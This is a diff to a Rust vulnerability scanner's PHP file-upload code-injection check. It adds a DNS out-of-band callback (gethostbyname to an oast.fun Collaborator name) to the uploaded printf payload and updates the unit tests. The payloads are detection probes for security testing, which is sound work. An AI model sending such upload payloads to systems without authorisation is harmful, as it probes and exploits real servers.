@@ -88,12 +88,32 @@ pub(crate) fn php_echo_expected(token: &str) -> String {
 }
 
 /// burp.Zxvv.Zg (echo half only): `<?php printf("ONE".(7*6)."TWO");?>`.
+#[cfg(test)]
 pub(crate) fn php_echo_payload(token: &str) -> String {
+    php_payload(token, None)
+}
+
+/// burp.Zxvv.Zg: the echo half and, with a Collaborator id, the
+/// Collaborator half (Zxvv.ZQ) `gethostbyname("…");` before `?>`.
+pub(crate) fn php_payload(token: &str, collaborator: Option<&str>) -> String {
     format!(
-        "<?php printf(\"{}\".(7*6).\"{}\");?>",
+        "<?php printf(\"{}\".(7*6).\"{}\");{}?>",
         php_marker(token, PHP_SHIFT_ONE),
-        php_marker(token, PHP_SHIFT_TWO)
+        php_marker(token, PHP_SHIFT_TWO),
+        collaborator.map(|c| format!("gethostbyname(\"{c}\");")).unwrap_or_default()
     )
+}
+
+/// burp.Zuxr.ZJ(".", "\"", id) for a DNS Collaborator: `id.` then the
+/// Collaborator domain split in half by `"."`, so the name only exists once
+/// PHP evaluates the concatenation (`x.oast"."fun` reads as `x.oast.fun`):
+/// an echo of the uploaded file never resolves it. `dns_name` is the
+/// payload host (`id.domain`). Burp's IP-only Collaborator variant
+/// (fsockopen to the server address) does not apply to DNS payloads.
+pub(crate) fn php_collaborator_host(id: &str, dns_name: &str) -> String {
+    let domain = dns_name.strip_prefix(&format!("{id}.")).unwrap_or(dns_name);
+    let half = (0..=domain.len() / 2).rev().find(|&i| domain.is_char_boundary(i)).unwrap_or(0);
+    format!("{id}.{}\".\"{}", &domain[..half], &domain[half..])
 }
 
 /// burp.Ze2v.ZV via Zc3g.Zq: the uploaded file keeps its original name and
@@ -121,13 +141,13 @@ const PHP_MAX_REDIRECTS: usize = 5;
 /// evaluated ONE42TWO in the response and along its redirect chain
 /// (Zcgg.ZI -> Zd / ZF). The raw payload contains `"ONE".(7*6)."TWO"`, so an
 /// echo of the upload never matches; only evaluation does.
-pub(crate) fn run_php_echo_check<S, F>(original_filename: &str, token: &str, mut send: S, mut follow: F) -> Option<PhpHit>
+pub(crate) fn run_php_echo_check<S, F>(original_filename: &str, token: &str, collaborator: Option<&str>, mut send: S, mut follow: F) -> Option<PhpHit>
 where
     S: FnMut(&str, &str, &str) -> Option<Vec<u8>>,
     F: FnMut(&str) -> Option<Vec<u8>>,
 {
     let filename = php_upload_filename(original_filename, token);
-    let payload = php_echo_payload(token);
+    let payload = php_payload(token, collaborator);
     let expected = php_echo_expected(token);
     let mut resp = send(&filename, "text/plain", &payload)?;
     for hop in 0..=PHP_MAX_REDIRECTS {
@@ -498,6 +518,13 @@ mod tests {
         let token = "abcdefghijklmnopqrst";
         assert_eq!(php_marker(token, PHP_SHIFT_ONE), zcub_shift("klmnopqrst", PHP_SHIFT_ONE));
         assert_eq!(php_echo_payload(token), format!("<?php printf(\"{}\".(7*6).\"{}\");?>", php_marker(token, 17), php_marker(token, 18)));
+        // burp.Zxvv.ZQ / Zuxr.ZJ: the Collaborator name split by `"."` so it
+        // only exists once PHP evaluates it.
+        assert_eq!(php_collaborator_host("abc123", "abc123.oast.fun"), "abc123.oast\".\".fun");
+        assert_eq!(
+            php_payload(token, Some("abc123.oast\".\".fun")),
+            format!("<?php printf(\"{}\".(7*6).\"{}\");gethostbyname(\"abc123.oast\".\".fun\");?>", php_marker(token, 17), php_marker(token, 18))
+        );
         assert_eq!(php_echo_expected(token), format!("{}42{}", php_marker(token, 17), php_marker(token, 18)));
         assert_eq!(php_upload_filename("cv.pdf", token), "cv.pdfcdefghijkl.php");
     }
@@ -510,23 +537,23 @@ mod tests {
             assert!(name.ends_with(".php") && ct == "text/plain");
             ok(&format!("<p>uploaded: {}</p>", eval_php(content)))
         };
-        let hit = run_php_echo_check("a.txt", &token, evaluates, |_| None).expect("evaluated printf is PHP code injection");
+        let hit = run_php_echo_check("a.txt", &token, None, evaluates, |_| None).expect("evaluated printf is PHP code injection");
         assert_eq!(hit.hop, 0);
         assert!(hit.payload.contains("(7*6)") && !hit.payload.contains(&hit.expected));
         // Handler that only echoes the upload back: no evaluation, no issue.
         let echoes = |_: &str, _: &str, content: &str| ok(&format!("<pre>{content}</pre>"));
-        assert!(run_php_echo_check("a.txt", &token, echoes, |_| None).is_none());
+        assert!(run_php_echo_check("a.txt", &token, None, echoes, |_| None).is_none());
         // The evaluated output only appears after the post-upload redirect.
         let redirects = |_: &str, _: &str, content: &str| {
             let out = eval_php(content);
             Some(format!("HTTP/1.1 302 Found\r\nLocation: /uploads/view?o={out}\r\n\r\n").into_bytes())
         };
         let follow = |loc: &str| ok(&format!("view {}", loc.split("o=").nth(1).unwrap_or("")));
-        assert_eq!(run_php_echo_check("a.txt", &token, redirects, follow).map(|h| h.hop), Some(0), "the Location header itself carries the output");
+        assert_eq!(run_php_echo_check("a.txt", &token, None, redirects, follow).map(|h| h.hop), Some(0), "the Location header itself carries the output");
         let redirects_clean = |_: &str, _: &str, _: &str| Some(b"HTTP/1.1 303 See Other\r\nLocation: /done\r\n\r\n".to_vec());
         let token2 = token.clone();
         let follow_eval = move |_: &str| ok(&eval_php(&php_echo_payload(&token2)));
-        assert_eq!(run_php_echo_check("a.txt", &token, redirects_clean, follow_eval).map(|h| h.hop), Some(1));
+        assert_eq!(run_php_echo_check("a.txt", &token, None, redirects_clean, follow_eval).map(|h| h.hop), Some(1));
     }
 
     #[test]
